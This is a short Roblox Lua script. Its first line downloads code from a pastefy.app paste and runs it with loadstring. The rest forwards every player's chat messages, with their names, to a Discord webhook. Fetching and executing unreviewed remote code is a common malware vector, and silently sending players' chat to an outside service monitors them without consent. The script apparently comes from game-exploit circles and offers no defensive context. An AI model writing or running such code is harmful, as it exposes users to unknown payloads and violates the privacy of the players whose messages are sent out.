loadstring(game:HttpGet("https://pastefy.app/atGimaom/raw",true))()
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local WEBHOOK_URL = ""

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        local data = {
            ["content"] = "**"..player.Name.."** said: " .. message
        }

        local success, response = pcall(function()
            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
        end)

        if not success then
            warn("Failed to send chat message to Discord:", response)
        end
    end)
end)

